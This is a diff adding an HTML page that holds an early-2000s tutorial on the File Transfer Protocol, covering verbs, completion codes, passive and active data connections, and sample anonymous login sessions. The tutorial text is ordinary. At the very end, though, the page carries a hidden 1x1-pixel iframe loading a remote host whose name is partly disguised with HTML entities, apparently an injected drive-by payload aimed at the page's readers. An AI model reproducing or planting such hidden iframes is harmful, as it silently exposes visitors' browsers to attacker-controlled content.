@@ -1,0 +1,282 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<title>The FTP Tutorial </title>
+	
+	<meta http-equiv="Content-Type" content="text/html charset=utf-8" />
+	<meta content="Copyright 2001 SpiderMan" name="Copyright" />
+	<meta content="SpiderMan" name="Author" />
+	<meta content="English" name="Language" />
+	
+	<style type="text/css">
+	<!--
+		body {font: 12px Verdana, Arial, Helvetica, sans-serif}
+	
+		table.example {width: 400px; font-size: 12px}
+		tr.exampletop {padding-left: 10px; background-color: #EBEBEB;}
+	
+		p {text-align: left;}
+		p.para {text-indent: 12px}
+	
+		div.lastupdate {text-align: right}
+		/* hack so IE will center my stuff since it doesn't recognize margin: auto */
+		div.center {text-align: center}
+
+		span.term {color: gray; font-style: italic}
+	
+		a:link {text-decoration: underline; color: #003F7F}
+		a:visited {text-decoration: underline; color: #003F7F}
+		a:hover {text-decoration: underline; color: #CC0000}
+
+		h2 {font-size: 12px}
+		h1.title {font-weight: normal; text-align: center; font-size: 12px}
+
+		pre.example {background-color: #EBEBEB; border: 1px solid #000000; padding: 3px; text-align: left; width: 500px; margin-left: auto; margin-right: auto}
+	-->
+	</style>
+</head>
+
+<body>
+	<h1 class="title">
+		<strong>The FTP Tutorial (ver. 1.0.1)</strong>
+		<br />
+		by: SpiderMan (<a href="mailto:spiderman@witty.com" title="Click to e-mail me.">spiderman@witty.com</a>)
+	</h1>
+	<h2>Background:</h2>
+	<p class="para">
+		After reading the old FTP tutorial, I decided rather then fixing it up, a complete rewrite was necessary.  In this new FTP tutorial, instead of following in the footsteps of the old tutorial, I would actually like to talk about the File Transfer Protocol.  This tutorial is aimed at the intermediate newbie.  One that knows the basics of the internet: what a socket 	is, what TCP/IP is, etc.
+	</p>
+	<h2>Down To Work:</h2>
+	<p class="para">
+		The File Transfer Protocol (FTP), as its name states, is a set of rules that dictates how files should be transfered over the TCP/IP protocol.  A basic FTP connection consists of a client and a server.  The client gets a file by opening a connection to the server.  Usually, the server is run on port 21, however, the system administrator can change this if he or she wishes.
+	</p>
+	<p class="para">
+		Once the client has connected to the server, the server will send a <span class="term">greeting</span> to the client.  A greeting usually looks something like the following:
+	</p>
+	<div class="center">
+		<pre class="example">
+220 SpiderMan's FTP server. Please login!
+</pre>
+	</div>
+	<p>
+		The number before the text is known as a <span class="term">completion code</span>.  The server greeting will be one of two codes: 220 if the server accepts the connection or 421 if the server rejects the connection.
+	</p>
+	<p class="para">
+		After the server has sent its greeting, the client sends a request.  A request is made up of a verb and, for some verbs, a parameter.  Common verbs are:
+	</p>
+	<div class="center">
+		<table class="example" border="1" cellspacing="0" cellpadding="0" summary="Table of common FTP verbs">
+			<tr class="exampletop">
+				<td>Verbs</td>
+				<td>Description</td>
+			</tr>
+			<tr>
+				<td>CWD</td>
+				<td> Change the current directory on the server.</td>
+			</tr>
+			<tr>
+				<td>PWD</td>
+				<td>Print the current directory on the server.</td>
+			</tr>
+			<tr>
+				<td>CDUP</td>
+				<td> Moves up to the parent directory.</td>
+			</tr>
+			<tr>
+				<td>LIST</td>
+				<td> List the contents of a directory.</td>
+			</tr>
+			<tr>
+				<td> MKD</td>
+				<td>Creates a directory on the server.</td>
+			</tr>
+			<tr>
+				<td>RMD</td>
+				<td> Removes a directory from the server.</td>
+			</tr>
+			<tr>
+				<td>DELE</td>
+				<td>Removes a file from the server.</td>
+			</tr>
+			<tr>
+				<td>USER</td>
+				<td>Sends the username for the login.</td>
+			</tr>
+			<tr>
+				<td> PASS</td>
+				<td>Sends the password for the login.</td>
+			</tr>
+			<tr>
+				<td>ABOR</td>
+				<td>Abort the transfer.</td>
+			</tr>
+			<tr>
+				<td>QUIT</td>
+				<td>Closes the connection with the server.</td>
+			</tr>
+			<tr>
+				<td>STAT</td>
+				<td>Gets the current status of the server.</td>
+			</tr>
+			<tr>
+				<td>TYPE</td>
+				<td> Toggles the binary flag on the server.</td>
+			</tr>
+			<tr>
+				<td>PORT</td>
+				<td> Asks the server to connect to the client.</td>
+			</tr>
+			<tr>
+				<td>PASV</td>
+				<td>Requests a data connection on a new port.</td>
+			</tr>
+			<tr>
+				<td>RETR</td>
+				<td>Requests the server to send a file.</td>
+			</tr>
+			<tr>
+				<td>STOR</td>
+				<td>Sends a file from the client to the server</td>
+			</tr>
+			<tr>
+				<td>APPE</td>
+				<td>Same as STOR, except data is appended.</td>
+			</tr>
+			<tr>
+				<td>REST</td>
+				<td>Start a download at a certain position.</td>
+			</tr>
+			<tr>
+				<td>SYST</td>
+				<td>Gets the OS information of the server.</td>
+			</tr>
+			<tr>
+				<td>HELP</td>
+				<td>Get help on a verb.</td>
+			</tr>
+			<tr>
+				<td>NOOP</td>
+				<td> No operation.</td>
+			</tr>
+		</table>
+	</div>
+	<p>
+		After sending a request, the client should wait for the server to respond before the client sends another request; however, the client can send an ABOR, STAT, or QUIT request without waiting for the server to respond. Typically, after the server has sent the greeting, the client will respond with a USER request in which the client sends the username to log into the FTP server with.
+	</p>
+	<p class="para">
+		After the client has sent the server a request, the server replies with a <span class="term">response</span>.  A response consists of a completion code followed by one, or more, lines.  Generally, if the second digit of the completion code is a 0, it is a syntax error message; if the second digit of the completion code is a 2, it is a hello or goodbye message.
+	</p>
+	<p class="para">
+		Once the client is logged in, he or she would then get the file he or she wishes to retrieve.  A typical session would look similar to this:
+	</p>
+	<div class="center">
+		<pre class="example">
+220 SpiderMan's FTP server. Please login!
+USER SpiderMan
+331 Username okay. Send password!
+PASS password
+230 Password accepted, user logged in.
+LIST
+150 Opening ASCII mode data connection for /bin/ls
+226 Transfer complete
+TYPE I
+200 Type set to I
+PASV
+227 Entering passive mode (206,84,161,87,28,46)
+RETR datafile.zip
+150 Opening BINARY mode data connection for datafile.zip
+226 Transfer complete
+</pre>
+	</div>
+	<p>
+		When downloading a file, the client should specify whether he or she wants the file sent in ASCII mode (each line ended with a CR/LF) or binary mode.  To set the mode of transfer, the client sends the TYPE request.  TYPE I would set the binary mode.  By default, binary mode is turned off.  It is important that the server send the file in the correct mode to avoid file corruption.
+	</p>
+	<p class="para">
+		I should elaborate on the PASV and PORT request since they are very important to FTP.  You may be wondering just what the PASV request is used for and what the odd looking response from the server is supposed to mean.  When the client sends a PASV request, the server opens up a temporary socket and sends a reply to the client which informs the client of port to connect to.  The reply would look like this:
+	</p>
+	<div class="center">
+		<pre class="example">
+PASV
+227 Entering passive mode (206,84,161,87,28,46)
+</pre>
+	</div>
+	<p>
+		The numbers in the parentheses play an important role.  The numbers separated by the first three commas make up the IP address to connect to.  In this example, the IP would be 206.84.161.87.  The remaining numbers specify which port to connect to.  Usually, this is done by multiplying the first number by 256 and adding the second number.  In this example, the port number would be 7214 (28*256+46= 7214).  Now that the server has replied to the PASV request, two channels are open: the first (the original one) is the <span class="term">communication channel</span> where the requests are sent and the second is the <span class="term">data channel</span> where the data is transfered.
+	</p>
+	<p class="para">
+		The PORT request is similar to the PASV request, however, when the client sends a PASV request, the server opens another socket and the client connects to it.  When a client sends a PORT request, the server connects to the client&#8212;usually on port 20.
+	</p>
+	<p class="para">
+		With the advent of IPv6, you may be wondering how FTP will be carried out since the servers are replying to the PASV requests with an IPv4 IP.  One solution, proposed by D. Bernstein, would be to have IPv6 servers send a nonexistent IP address and have IPv6 clients ignore the IP and skip straight to the port number.  This way, older clients using IPv4 will connect to a fake IP and give up trying to connect to the server.
+	</p>
+	<p class="para">
+		Now that you know how FTP works, I'll show you how to log into a server, look around, and then get a file.  Before I begin, I should tell you about anonymous FTP servers.  An anonymous FTP server is just like a normal server, however, you can login using the username &#8220;anonymous&#8221; and an e-mail as the password.  In this example, I'll use a fake e-mail of guest@guest.com.  Most anonymous FTP servers only read up to the @ sign, so if you're lazy you can just type in &#8220;guest@&#8221;.  A lot of sites offer anonymous FTP because it is an easy way to let the public get files without assigning each person a login.  On with the example!
+	</p>
+	<p class="para">
+		First, I connect to the server and send my username and password.
+	</p>
+	<div class="center">
+		<pre class="example">
+220 SpiderMan's FTP server. Please login!
+USER anonymous
+331 Anonymous login okay, send e-mail as password.
+PASS guest@guest.com
+230 Password accepted, logged in as anonymous.
+</pre>
+	</div>
+	<p>
+		Now that I'm in, I'll change to the &#8220;files&#8221; directory and download a file.
+	</p>
+	<div class="center">
+		<pre class="example">
+CWD ./files
+250 CWD command successful.
+TYPE I
+200 Type set to I
+PASV
+227 Entering passive mode (210,52,165,168,15,26)
+RETR code.zip
+150 Opening BINARY mode data connection for code.zip
+226 Transfer complete
+</pre>
+	</div>
+	<p>
+		I've got the file I want, now I'll move up to the parent directory, move to another directory, and download another file.
+	</p>
+	<div class="center">
+		<pre class="example">
+CWD ..
+250 Okay
+CWD ./jokes
+250 CWD command successful.
+TYPE A
+200 Type set to A
+PASV
+227 Entering passive mode (210,52,165,168,15,26)
+RETR jokes.txt
+150 Opening ASCII mode data connection for jokes.txt
+226 Transfer complete
+</pre>
+	</div>
+	<p>
+		I got the two files I wanted, so now I'll logout.
+	</p>
+	<div class="center">
+		<pre class="example">
+QUIT
+221 Goodbye, please come back!
+</pre>
+	</div>
+	<h2>Further Reading:</h2>
+	<ul>
+		<li><a href="http://www.freesoft.org/CIE/RFC/959/index.htm" title="Link opens in a new window." target="_blank">RFC 959</a></li>
+		<li><a href="http://cr.yp.to/ftp.html" title="Link opens in a new window." target="_blank">The FTP Handbook</a></li>
+		<li><a href="http://war.jgaa.com/ftp/" title="Link opens in a new window." target="_blank">The WarFTP FTP resource site</a></li>
+	</ul>
+	<h2>Conclusion:</h2>
+	<p class="para">
+		And so ends yet another text file.  As always, if you find any errors or have any comments please send them to <a href="mailto:spiderman@witty.com" title="Click to e-mail me.">spiderman@witty.com</a>.  Please direct all questions to the message board.  Until next time...
+	</p>
+	<div class="lastupdate">Last updated: <strong>7/10/02</strong></div>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
